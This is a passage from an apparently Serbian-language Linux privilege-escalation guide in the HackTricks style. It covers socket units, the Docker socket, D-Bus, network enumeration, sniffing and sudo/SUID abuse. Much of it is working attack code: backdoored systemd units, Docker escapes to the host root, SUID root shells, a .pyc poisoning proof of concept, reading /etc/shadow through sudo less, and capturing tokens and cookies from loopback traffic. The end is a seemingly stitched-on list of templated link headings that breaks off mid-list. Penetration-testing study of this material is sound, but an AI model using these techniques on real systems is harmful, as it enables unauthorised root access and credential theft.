- `Accept`: Prima boolean argument. Ako je **true**, za svaku dolaznu konekciju se pokreće **service instance** i prosleđuje joj se samo connection socket. Ako je **false**, svi listening sockets se **prosleđuju pokrenutoj service unit**, i samo jedna service unit se pokreće za sve konekcije. Ova vrednost se ignoriše za datagram sockets i FIFOs gde jedna service unit bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevano je false**. Zbog performansi, preporučuje se da se novi daemons pišu samo na način koji odgovara za `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Prima jednu ili više komandnih linija, koje se **izvršavaju pre** ili **posle** toga što su listening **sockets**/FIFOs **kreirani** i povezani, redom. Prvi token komandne linije mora biti apsolutni filename, a zatim argumenti za proces.
- `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se **izvršavaju pre** ili **posle** toga što su listening **sockets**/FIFOs **zatvoreni** i uklonjeni, redom.
- `Service`: Određuje ime **service** unit koja se **aktivira** na **incoming traffic**. Ova postavka je dozvoljena samo za sockets sa Accept=no. Podrazumevano je service koja ima isto ime kao socket (sa zamenjenim sufiksom). U većini slučajeva ne bi trebalo da bude potrebno koristiti ovu opciju.

### Writable .socket files

Ako pronađeš **writable** `.socket` fajl, možeš da dodaš na početak `[Socket]` sekcije nešto poput: `ExecStartPre=/home/kali/sys/backdoor` i backdoor će se izvršiti pre nego što se socket kreira. Zbog toga će ti **verovatno biti potrebno da sačekaš da se mašina reboot-uje.**\
_Napomena: sistem mora da koristi tu socket file konfiguraciju, inače backdoor neće biti izvršen_

### Socket activation + writable unit path (create missing service)

Još jedna ozbiljna misconfiguration je:

- socket unit sa `Accept=no` i `Service=<name>.service`
- referencirana service unit nedostaje
- attacker može da upisuje u `/etc/systemd/system` (ili drugi unit search path)

U tom slučaju, attacker može da kreira `<name>.service`, zatim da pokrene traffic ka socketu tako da systemd učita i izvrši novu service kao root.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Upisivi socket-i

Ako **identifikujete bilo koji upisivi socket** (_sada govorimo o Unix socket-ima, a ne o config `.socket` fajlovima_), onda **možete komunicirati** sa tim socket-om i možda iskoristiti ranjivost.

### Enumeracija Unix socket-ova
```bash
netstat -a -p --unix
```
### Direktna konekcija
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Primer eksploatacije:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Napomena da mogu postojati neki **sockets koji slušaju HTTP** zahteve (_ne govorim o .socket fajlovima, već o fajlovima koji funkcionišu kao unix sockets_). Ovo možete proveriti pomoću:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Ako socket **odgovori sa HTTP** zahtevom, onda možete **komunicirati** sa njim i možda **iskoristiti neku ranjivost**.

### Docker Socket sa mogućnošću upisa

Docker socket, koji se često nalazi na `/var/run/docker.sock`, je kritična datoteka koja treba da bude obezbeđena. Podrazumevano, može da upisuje `root` korisnik i članovi `docker` grupe. Imati write pristup ovom socketu može dovesti do privilege escalation. Evo pregleda kako se to može uraditi i alternativnih metoda ako Docker CLI nije dostupan.

#### **Privilege Escalation sa Docker CLI**

Ako imate write pristup Docker socketu, možete eskalirati privilegije koristeći sledeće komande:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ove komande vam omogućavaju da pokrenete container sa root-level pristupom fajl sistemu hosta.

#### **Using Docker API Directly**

U slučajevima kada Docker CLI nije dostupan, Docker socket se i dalje može manipulisati pomoću Docker API-ja i `curl` komandi.

1.  **List Docker Images:** Preuzmite listu dostupnih images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Pošaljite zahtev za kreiranje container-a koji montira root direktorijum host sistema.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Pokrenite novo kreirani container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Koristite `socat` da uspostavite konekciju sa container-om, omogućavajući izvršavanje komandi unutar njega.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon podešavanja `socat` konekcije, možete direktno izvršavati komande u container-u sa root-level pristupom fajl sistemu hosta.

### Others

Napomena: ako imate write permissions nad docker socket-om zato što ste **unutar grupe `docker`**, imate [**više načina da escalirate privileges**](interesting-groups-linux-pe/index.html#docker-group). Ako [**docker API sluša na portu**](../../network-services-pentesting/2375-pentesting-docker.md#compromising), možete takođe biti u mogućnosti da ga compromise-ujete.

Proverite **više načina da pobegnete iz container-a ili abuse-ujete container runtimes da biste escalirali privileges** u:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ako utvrdite da možete da koristite **`ctr`** komandu, pročitajte sledeću stranicu, jer **možda možete da je abuse-ujete za escalaciju privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ako utvrdite da možete da koristite **`runc`** komandu, pročitajte sledeću stranicu, jer **možda možete da je abuse-ujete za escalaciju privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je sofisticiran **inter-Process Communication (IPC) system** koji omogućava aplikacijama da efikasno komuniciraju i dele podatke. Dizajniran imajući u vidu moderni Linux sistem, nudi robustan framework za različite oblike komunikacije između aplikacija.

Ovaj sistem je svestran, podržava osnovni IPC koji unapređuje razmenu podataka između procesa, nalik na **enhanced UNIX domain sockets**. Pored toga, pomaže u broadcast-ovanju događaja ili signala, podstičući besprekornu integraciju među sistemskim komponentama. Na primer, signal od Bluetooth daemon-a o dolaznom pozivu može naterati music player da utiša zvuk, poboljšavajući user experience. Dodatno, D-Bus podržava remote object system, pojednostavljujući service requests i method invocations između aplikacija, i pojednostavljuje procese koji su tradicionalno bili složeni.

D-Bus radi po **allow/deny modelu**, upravljajući message permissions (method calls, signal emissions, itd.) na osnovu kumulativnog efekta pravila politike koja se poklapaju. Ove politike specificiraju interakcije sa bus-om, potencijalno omogućavajući escalaciju privileges kroz exploitation ovih dozvola.

Primer takve politike u `/etc/dbus-1/system.d/wpa_supplicant.conf` je dat, i prikazuje dozvole za root user-a da poseduje, šalje i prima poruke od `fi.w1.wpa_supplicant1`.

Politike bez navedenog user-a ili group-e važe univerzalno, dok "default" context politike važe za sve što nije pokriveno drugim specifičnim politikama.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Learn how to enumerate and exploit a D-Bus communication here:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mreža**

Uvek je zanimljivo enumerisati mrežu i utvrditi poziciju mašine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Brza trijaža outbound filtriranja

Ako host može da izvršava komande, ali callback-ovi ne uspevaju, brzo razdvojte DNS, transport, proxy i route filtriranje:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Otvoreni portovi

Uvek proveri mrežne servise koji rade na mašini sa kojima nisi mogao da interaguješ pre nego što joj pristupiš:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Klasifikuj listeners po bind target-u:

- `0.0.0.0` / `[::]`: izloženi na svim lokalnim interfejsima.
- `127.0.0.1` / `::1`: samo lokalno (dobri kandidati za tunnel/forward).
- Specifični interni IP-ovi (npr. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): obično dostupni samo iz internih segmenata.

### Local-only service triage workflow

Kada kompromituješ host, servisi vezani za `127.0.0.1` često postanu dostupni prvi put iz tvoje shell sesije. Brz lokalni workflow je:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS kao mrežni skener (network-only mode)

Pored lokalnih PE provera, linPEAS može da radi kao fokusirani mrežni skener. Koristi dostupne binarne fajlove u `$PATH` (obično `fping`, `ping`, `nc`, `ncat`) i ne instalira tooling.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Ako proslediš `-d`, `-p` ili `-i` bez `-t`, linPEAS se ponaša kao čisti mrežni skener (preskačući ostatak provera za privilege-escalation).

### Sniffing

Proveri da li možeš da sniff-uješ saobraćaj. Ako možeš, možda ćeš moći da uzmeš neke kredencijale.
```
timeout 1 tcpdump
```
Brze praktične provere:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) je posebno vredan u post-exploitation jer mnogi servisi dostupni samo interno tamo izlažu tokene/kolačiće/akreditive:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Capture sada, parsiraj kasnije:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Korisnici

### Generička Enumeration

Proverite **ko** ste, koje **privilegije** imate, koji su **korisnici** u sistemu, koji mogu da se **login** i koji imaju **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Neke Linux verzije bile su pogođene bagom koji omogućava korisnicima sa **UID > INT_MAX** da eskaliraju privilegije. Više informacija: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Iskoristi ga** pomoću: **`systemd-run -t /bin/bash`**

### Groups

Proveri da li si **član neke grupe** koja bi mogla da ti da root privilegije:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Proveri da li se nešto zanimljivo nalazi unutar clipboard-a (ako je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinki
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

Ako **znate bilo koju lozinku** iz okruženja, **pokušajte da se prijavite kao svaki korisnik** koristeći tu lozinku.

### Su Brute

Ako vam ne smeta da pravite mnogo buke i `su` i `timeout` binari postoje na računaru, možete pokušati brute-force napad na korisnike pomoću [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa `-a` parametrom takođe pokušava brute-force nad korisnicima.

## Zloupotrebe upisivog PATH-a

### $PATH

Ako otkrijete da možete da **pišete unutar nekog foldera iz $PATH**, možda ćete moći da eskalirate privilegije tako što ćete **napraviti backdoor unutar upisivog foldera** sa imenom neke komande koja će biti izvršena od strane drugog korisnika (idealno root) i koja **ne učitava se iz foldera koji se nalazi pre** vašeg upisivog foldera u $PATH.

### SUDO and SUID

Možda će vam biti dozvoljeno da izvršite neku komandu koristeći sudo ili ona može imati suid bit. Proverite to koristeći:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neke **neočekivane komande vam omogućavaju da čitate i/ili pišete fajlove ili čak izvršite komandu.** Na primer:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguracija može dozvoliti korisniku da izvrši neku komandu sa privilegijama drugog korisnika, bez znanja lozinke.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru korisnik `demo` može da pokrene `vim` kao `root`, i sada je trivijalno dobiti shell dodavanjem ssh ključa u root direktorijum ili pozivanjem `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **postavi environment variable** dok izvršava nešto:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **zasnovan na HTB mašini Admirer**, bio je **ranjiv** na **PYTHONPATH hijacking** kako bi se učitala proizvoljna python biblioteka dok se skripta izvršava kao root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Writable `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports

Ako **sudo-allowed Python script** importuje modul čiji paket direktorijum sadrži **writable `__pycache__`**, možda možeš da zameniš cached `.pyc` i dobiješ izvršavanje koda kao privileged user pri sledećem importu.

- Zašto radi:
- CPython skladišti bytecode cache u `__pycache__/module.cpython-<ver>.pyc`.
- Interpreter validira **header** (magic + timestamp/hash metadata vezana za source), a zatim izvršava marshaled code object koji se nalazi posle tog headera.
- Ako možeš da **obrišeš i ponovo kreiraš** cached fajl zato što je direktorijum writable, root-owned ali non-writable `.pyc` i dalje može da se zameni.
- Tipična putanja:
- `sudo -l` pokazuje Python script ili wrapper koji možeš da pokreneš kao root.
- Taj script importuje lokalni modul iz `/opt/app/`, `/usr/local/lib/...`, itd.
- `__pycache__` direktorijum importovanog modula je writable za tvoj user ili za sve.

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Ako možeš da pregledaš privilegovani skript, identifikuj importovane module i njihovu cache putanju:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Abuse workflow:

1. Pokreni sudo-allowed skriptu jednom da Python kreira legitimnu cache datoteku ako ona već ne postoji.
2. Pročitaj prvih 16 bajtova iz legitimnog `.pyc` i ponovo ih iskoristi u poisoned fajlu.
3. Kompajliraj payload code object, `marshal.dumps(...)` ga, obriši originalnu cache datoteku i ponovo je kreiraj sa originalnim headerom plus tvojim malicious bytecode.
4. Ponovo pokreni sudo-allowed skriptu tako da import izvrši tvoj payload kao root.

Važne napomene:

- Ponovno korišćenje originalnog headera je ključno jer Python proverava metadata cache-a u odnosu na source fajl, a ne da li se bytecode body zaista poklapa sa source-om.
- Ovo je posebno korisno kada je source fajl root-owned i nije writable, ali je sadržajni `__pycache__` direktorijum writable.
- Attack pada ako privileged process koristi `PYTHONDONTWRITEBYTECODE=1`, importuje iz lokacije sa safe permissions, ili ukloni write access na svaki direktorijum u import path-u.

Minimal proof-of-concept shape:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Uverite se da nijedan direktorijum u privilegovanom Python import path-u nije upisiv od strane neprivilegovanih korisnika, uključujući `__pycache__`.
- Za privilegovana pokretanja, razmotrite `PYTHONDONTWRITEBYTECODE=1` i periodične provere na neočekivane upisive `__pycache__` direktorijume.
- Tretirajte upisive lokalne Python module i upisive cache direktorijume isto kao što biste tretirali upisive shell skripte ili shared libraries koje izvršava root.

### BASH_ENV preserved via sudo env_keep → root shell

Ako sudoers čuva `BASH_ENV` (npr. `Defaults env_keep+="ENV BASH_ENV"`), možete iskoristiti Bash-ovo neinteraktivno ponašanje pri pokretanju da izvršite proizvoljan kod kao root kada pozivate dozvoljenu komandu.

- Zašto radi: Za neinteraktivne shell-ove, Bash evaluira `$BASH_ENV` i source-uje taj fajl pre pokretanja ciljne skripte. Mnoga sudo pravila dozvoljavaju pokretanje skripte ili shell wrapper-a. Ako sudo čuva `BASH_ENV`, vaš fajl se source-uje sa root privilegijama.

- Zahtevi:
- sudo pravilo koje možete da pokrenete (bilo koji target koji poziva `/bin/bash` neinteraktivno, ili bilo koja bash skripta).
- `BASH_ENV` prisutan u `env_keep` (proverite sa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Ukloniti `BASH_ENV` (i `ENV`) iz `env_keep`, prefer `env_reset`.
- Izbegavati shell wrappers za sudo-odobrene komande; koristiti minimalne binaries.
- Razmotriti sudo I/O logging i alerting kada se koriste preserved env vars.

### Terraform via sudo sa preserved HOME (!env_reset)

Ako sudo ostavi environment netaknut (`!env_reset`) dok dozvoljava `terraform apply`, `$HOME` ostaje kao kod pozivajućeg usera. Terraform zato učitava **$HOME/.terraformrc** kao root i poštuje `provider_installation.dev_overrides`.

- Usmeriti traženi provider na writable direktorijum i ubaciti malicious plugin nazvan po provideru (npr. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform će pasti na Go plugin handshake, ali će izvršiti payload kao root pre nego što se sruši, ostavljajući SUID shell iza sebe.

### TF_VAR overrides + symlink validation bypass

Terraform promenljive mogu biti prosleđene preko `TF_VAR_<name>` environment variables, koje opstaju kada sudo sačuva environment. Slabe validacije kao što je `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` mogu se zaobići pomoću symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform rešava symlink i kopira pravi `/root/root.txt` u destinaciju koju napadač može da čita. Isti pristup može da se koristi za **pisanje** u privilegovane putanje tako što se unapred kreiraju destination symlinks (npr. usmeravanjem provider-ove destination putanje unutar `/etc/cron.d/`).

### requiretty / !requiretty

Na nekim starijim distribucijama, sudo može biti podešen sa `requiretty`, što forsira sudo da se pokreće samo iz interaktivnog TTY-a. Ako je `!requiretty` podešen (ili je opcija odsutna), sudo može da se izvršava iz neinteraktivnih konteksta kao što su reverse shells, cron jobs, ili scripts.
```bash
Defaults !requiretty
```
Ovo samo po sebi nije direktna ranjivost, ali proširuje situacije u kojima se sudo pravila mogu zloupotrebiti bez potrebe za punim PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Ako `sudo -l` pokaže `env_keep+=PATH` ili `secure_path` koji sadrži unose koji se mogu pisati od strane napadača (npr. `/home/<user>/bin`), svaka relativna komanda unutar sudo-dozvoljenog targeta može biti shadowed.

- Requirements: sudo pravilo (često `NOPASSWD`) koje pokreće skript/binarni fajl što poziva komande bez apsolutnih putanja (`free`, `df`, `ps`, itd.) i writable PATH unos koji se pretražuje prvi.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Zaobilaženje path-ova pri sudo izvršavanju
**Jump** na čitanje drugih fajlova ili korišćenje **symlinks**. Na primer, u sudoers fajlu: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se koristi **wildcard** (\*), još je lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

Ako je **sudo permission** dat jednoj komandi **bez navođenja putanje**: _hacker10 ALL= (root) less_ možete to iskoristiti promenom PATH varijable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika može da se koristi i ako **suid** binary **izvršava drugu komandu bez navođenja putanje do nje (uvek proveri sa** _**strings**_ **sadržaj čudnog SUID binary)**.

[Primeri payload-a za izvršavanje.](payloads-to-execute.md)

### SUID binary sa putanjom komande

Ako **suid** binary **izvršava drugu komandu navodeći putanju**, onda možeš da pokušaš da **exportuješ funkciju** nazvanu kao komanda koju suid fajl poziva.

Na primer, ako suid binary poziva _**/usr/sbin/service apache2 start**_ moraš da pokušaš da kreiraš funkciju i da je exportuješ:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, when you call the suid binary, this function will be executed

### Upisivi script koji izvršava SUID wrapper

Česta custom-app misconfiguration je root-owned SUID binary wrapper koji izvršava script, dok je sam script writable od strane low-priv users.

Tipičan obrazac:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Ako je `/usr/local/bin/backup.sh` upisiv, možete dodati payload komande i zatim izvršiti SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Brze provere:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Ovaj put napada je posebno čest u "maintenance"/"backup" wrapperima koji se isporučuju u `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable se koristi za navođenje jedne ili više shared libraries (.so fajlova) koje loader učitava pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces je poznat kao preloading biblioteke.

Međutim, radi očuvanja bezbednosti sistema i sprečavanja zloupotrebe ove funkcije, posebno kod **suid/sgid** izvršnih fajlova, sistem primenjuje određene uslove:

- Loader ignoriše **LD_PRELOAD** za izvršne fajlove kod kojih se real user ID (_ruid_) ne poklapa sa effective user ID (_euid_).
- Za izvršne fajlove sa suid/sgid, preload-uju se samo biblioteke iz standardnih path-ova koje su takođe suid/sgid.

Privilege escalation može da se dogodi ako imate mogućnost da izvršavate komande pomoću `sudo` i output od `sudo -l` sadrži stavku **env_keep+=LD_PRELOAD**. Ova konfiguracija omogućava da **LD_PRELOAD** environment variable ostane sačuvana i prepoznata čak i kada se komande pokreću sa `sudo`, što potencijalno može dovesti do izvršavanja proizvoljnog koda sa povišenim privilegijama.
```
Defaults        env_keep += LD_PRELOAD
```
# Ubuntu/Debian Privilege Escalation

```
cat /etc/os-release
```

## Pomoću `sudo`-a za izvršavanje komandi kao root

Pogledajte [Sudo and Sudo Caching](../linux-hardening/privilege-escalation/sudo-and-sudo-caching.md)

## Pomoću SUID binarnih fajlova za eskalaciju privilegija

Pogledajte [SUID binaries](../linux-hardening/privilege-escalation/suid-binaries.md)

## Pomoću capabilities za eskalaciju privilegija

Pogledajte [Linux Capabilities](../linux-hardening/privilege-escalation/linux-capabilities.md)

## Hijacking Process Environment

Pogledajte [Process Hijacking](../linux-hardening/privilege-escalation/process-hijacking.md)

## Hijacking Libraries

Pogledajte [Library Hijacking](../linux-hardening/privilege-escalation/library-hijacking.md)

## Hijacking Executables in PATH

Pogledajte [PATH Hijacking](../linux-hardening/privilege-escalation/path-hijacking.md)

## Hijacking Services

Pogledajte [Services Hijacking](../linux-hardening/privilege-escalation/services-hijacking.md)

## Hijacking Cron Jobs

Pogledajte [Cron Jobs](../linux-hardening/privilege-escalation/cron-jobs.md)

## Hijacking D-Bus Services

Pogledajte [D-Bus System Services](../linux-hardening/privilege-escalation/dbus-system-services.md)

## Hijacking timers

Pogledajte [Timers](../linux-hardening/privilege-escalation/timers.md)

## Hijacking Logs

Pogledajte [Logs](../linux-hardening/privilege-escalation/logs.md)

## Hijacking udev rules

Pogledajte [udev rules](../linux-hardening/privilege-escalation/udev.md)

## Hijacking Python libraries

Pogledajte [Python Hijacking](../linux-hardening/privilege-escalation/python-hijacking.md)

## Hijacking NFS root squash

Pogledajte [NFS no_root_squash](../linux-hardening/privilege-escalation/nfs.md)

## Hijacking AWS cli

Pogledajte [AWS CLI](../linux-hardening/privilege-escalation/aws-cli.md)

## Hijacking Kubernetes

Pogledajte [Kubernetes](../linux-hardening/privilege-escalation/kubernetes.md)

## Hijacking Ansible

Pogledajte [Ansible](../linux-hardening/privilege-escalation/ansible.md)

## Hijacking Apache

Pogledajte [Apache](../linux-hardening/privilege-escalation/apache.md)

## Hijacking MySQL

Pogledajte [MySQL](../linux-hardening/privilege-escalation/mysql.md)

## Hijacking Redis

Pogledajte [Redis](../linux-hardening/privilege-escalation/redis.md)

## Hijacking Docker

